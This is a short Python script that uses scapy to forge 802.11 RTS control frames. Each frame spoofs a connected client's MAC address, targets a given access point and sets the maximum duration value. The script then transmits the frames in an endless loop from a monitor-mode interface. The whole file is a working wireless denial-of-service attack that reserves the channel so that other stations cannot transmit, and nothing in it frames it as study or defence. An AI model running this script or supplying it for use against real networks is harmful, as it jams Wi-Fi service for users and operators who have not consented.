#! /usr/bin/python
from scapy.all import Dot11,RadioTap,sendp,hexdump
import argparse

ap = argparse.ArgumentParser()
ap.add_argument("-a", "--ap", required=True, help="Target AP MAC address")
ap.add_argument("-c", "--client", required=True, help="Connected client MAC address")
ap.add_argument("-i", "--interface", required=True, help="Monitor mode interfaceon the correct channel")

args = ap.parse_args()

iface = args.interface
apaddr = args.ap
srcaddr = args.client

packet = RadioTap()/Dot11(proto=0, FCfield=0, subtype=11, addr2=args.client, addr1=args.ap, type=1, ID=65535)

# packet = PPI(version=0, flags=0, notdecoded='\\x02\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000\\x00l\\t\\xc0\\x00\\x00\\x00\\xf9\\x00', len=32, dlt=105)/Dot11(proto=0, FCfield=0, subtype=11, addr2=args.client, addr1=args.ap, type=1, ID=65535)

packet.show()
raw_input("\nPress enter to start\n")
sendp(packet, iface=args.interface, inter=0.030, loop=1)

